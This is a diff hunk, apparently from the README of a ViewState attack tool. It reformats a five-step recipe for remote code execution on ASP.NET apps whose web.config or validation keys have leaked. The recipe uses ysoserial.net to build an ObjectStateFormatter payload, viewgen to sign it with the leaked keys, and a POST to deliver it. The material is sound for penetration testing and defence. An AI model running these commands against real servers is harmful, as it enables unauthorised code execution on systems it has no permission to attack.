@@ -84,23 +84,23 @@ DES/3DES SHA1
 
 Leaking the `web.config` file or validation keys from ASP.NET apps results in RCE via ObjectStateFormatter deserialization if ViewStates are used.
 
-1 - Generate a payload with [ysoserial.net](https://github.com/pwntester/ysoserial.net):
+**1 -** Generate a payload with [ysoserial.net](https://github.com/pwntester/ysoserial.net):
 
 ```bash
 ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "ping x.x.x.x"
 ```
 
-2 - Grab a modifier (`__VIEWSTATEGENERATOR` value) from a given endpoint of the webapp
+**2 -** Grab a modifier (`__VIEWSTATEGENERATOR` value) from a given endpoint of the webapp
 
-3 - Generate the signed/encrypted payload:
+**3 -** Generate the signed/encrypted payload:
 
 ```bash
 viewgen --webconfig web.config --modifier MODIFIER PAYLOAD
 ```
 
-4 - Send a POST request with the generated ViewState to the same endpoint
+**4 -** Send a POST request with the generated ViewState to the same endpoint
 
-5 - Profit 🎉🎉
+**5 -** - Profit 🎉🎉
 
 ---------------
 
